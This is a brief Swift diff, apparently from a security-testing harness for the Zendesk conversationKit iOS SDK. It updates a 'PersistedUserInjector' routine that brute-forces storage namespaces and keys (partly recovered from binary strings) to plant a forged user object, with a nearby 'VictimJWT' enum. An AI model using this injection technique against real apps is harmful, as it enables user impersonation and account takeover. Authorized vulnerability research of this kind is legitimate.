@@ -36,8 +36,9 @@ enum VictimJWT {
 enum PersistedUserInjector {
     /// 候选 namespace × key 组合 — persistedUserRetrieved 事件命中即证明注入成功
     static func injectForgedUser(_ user: User, log: @escaping (String) -> Void) {
-        let namespaces = ["conversationKit", "com.zendesk.conversationKit", "conversationKitStorage"]
-        let keys = ["user", "User", "currentUser", "user_state", "state"]
+        // UserProcessor 持久化域 (二进制字符串实证) + 键 = 前缀 + userId
+        let namespaces = ["com.zendesk.conversationkit.userprocessorlocaldatasource", "conversationKit", "com.zendesk.conversationKit", "conversationKitStorage"]
+        let keys = ["com.zendesk.conversationKit-User-u1", "com.zendesk.conversationKit-User-", "user", "currentUser"]
         for ns in namespaces {
             for st in [StorageType.basic, .complex] {
                 for key in keys {
